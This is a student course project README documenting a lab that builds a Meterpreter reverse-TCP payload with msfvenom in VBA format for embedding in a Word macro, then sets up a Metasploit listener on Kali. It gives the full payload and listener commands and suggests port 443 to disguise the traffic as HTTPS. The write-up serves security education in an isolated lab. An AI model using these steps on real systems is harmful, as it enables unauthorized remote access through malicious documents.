# IT 359 Project
This project demonstrates how a reverse shell payload can be created using msfvenom and embedded into a Microsoft Word macro as a proof-of-concept for educational and defensive security purposes. The objective is to simulate a common attack technique used by threat actors to gain unauthorized access to a target system, with the ultimate goal of understanding how such threats operate, how to identify them, and how to effectively defend against them.   

By following the steps outlined in this project, readers will gain insight into:  
  
How attackers craft and deliver malicious payloads using social engineering.  
How Microsoft Office macros can be exploited for code execution.  
Techniques for detecting and mitigating macro-based malware threats in enterprise environments.        
Technologies used will include Weaviate(built in AI and machine learning integration), OpenAI, proxmox, kali and windows, microsoft word    

# Day One: Topic 
After adding Ben to the group a little later into the semester, I opened up the Idea to doing a project that was little more realistic for our group to complete. I really just used AI and the project prompt to get some suggestions. Ultimately went with the subject explained above. Also used AI to create an outline of each members responsibilities by giving it our topic, timeline and number of memebers.
- Looking back, it was great for a start, but we should have revised it to be a little more compatible with our group.  

# MSFVenom Payload  
AI suggested using MSFVenom to create the payload and after looking into it, I realized that it was implemented in metasploite which we have experience with and acess to on our proxmox VMs. 
This was the main website I used to research the flags and how to use them(reading the instruction in the terminal is a bit of a headache for me) https://www.offsec.com/metasploit-unleashed/msfvenom/  
  
  Alternatively can use this resource https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-msfvenom.html
  
### Ultimately the command I came up with was msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f vba.  
#### -p
- the flag to start creating a payload
##### "windows" to target a windows machine(any of the promox machines in our case)  
#### "meterpreter" is the interactive shell component
#### "reverse_tcp" makes the victim reach out to our attacking machine
#### LHOST will be our attacking machines IP(kali linux proxmox vm)
#### LPORT will be the port we have our listener setup on
- Can use 4444 which is the metasploit default
- Another option is 443 if we want to be sneaky and make it look like HTTPS traffic  
#### -f VBA
- f = format of the output
- vba = visual basic for applications format

# Setting up the Listener  
### Really simple setup on the kali VM  
- Ths provides background knowledge on msfconsole commands https://www.offsec.com/metasploit-unleashed/msfconsole-commands/

### In your terminal run each command
#### msfconsole
#### use exploit/multihandler
#### set payload windows/meterpreter/reverse_tcp  
#### set LHOST our kali IP
#### set Lport(same port as in the payload)  
#### run
